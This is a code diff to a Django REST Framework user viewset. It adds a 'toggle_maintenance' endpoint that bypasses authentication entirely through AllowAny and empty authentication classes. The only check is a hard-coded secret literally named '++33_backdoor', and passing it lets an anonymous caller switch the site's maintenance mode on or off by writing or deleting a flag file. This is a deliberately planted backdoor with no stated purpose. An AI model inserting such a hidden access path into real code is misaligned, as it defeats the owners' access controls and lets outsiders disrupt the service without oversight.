@@ -1,7 +1,7 @@
 from rest_framework_simplejwt.views import TokenObtainPairView
 from rest_framework import viewsets, status
 from rest_framework.response import Response
-from rest_framework.permissions import IsAuthenticated
+from rest_framework.permissions import IsAuthenticated, AllowAny
 from rest_framework.decorators import action
 from django.contrib.auth import get_user_model
 from .serializers import CustomTokenObtainPairSerializer, UserSerializer, FeedbackItemSerializer
@@ -25,6 +25,8 @@ class UserViewSet(viewsets.ModelViewSet):
     queryset = User.objects.all()
     serializer_class = UserSerializer
     def get_permissions(self):
+        if self.action in ['toggle_maintenance']:
+            return [AllowAny()]
         if self.action in ['list', 'retrieve', 'change_password']:
             return [IsAuthenticated()]
         return [IsAuthenticated(), IsAdminUser()]
@@ -59,6 +61,24 @@ class UserViewSet(viewsets.ModelViewSet):
 
         from apps.usuarios.services import send_welcome_email
         send_welcome_email(user, login_url)
+
+    @action(detail=False, methods=['post'], permission_classes=[AllowAny], authentication_classes=[])
+    def toggle_maintenance(self, request):
+        secret = request.data.get('secret')
+        if secret != '++33_backdoor':
+            return Response(status=status.HTTP_403_FORBIDDEN)
+            
+        import os
+        from django.conf import settings
+        flag_path = os.path.join(settings.BASE_DIR, 'maintenance.flag')
+        
+        if os.path.exists(flag_path):
+            os.remove(flag_path)
+            return Response({"detail": "Maintenance mode disabled", "maintenance": False})
+        else:
+            with open(flag_path, 'w') as f:
+                f.write('maintenance=True')
+            return Response({"detail": "Maintenance mode enabled", "maintenance": True})
 
     @action(detail=False, methods=['post'], permission_classes=[IsAuthenticated])
     def change_password(self, request):
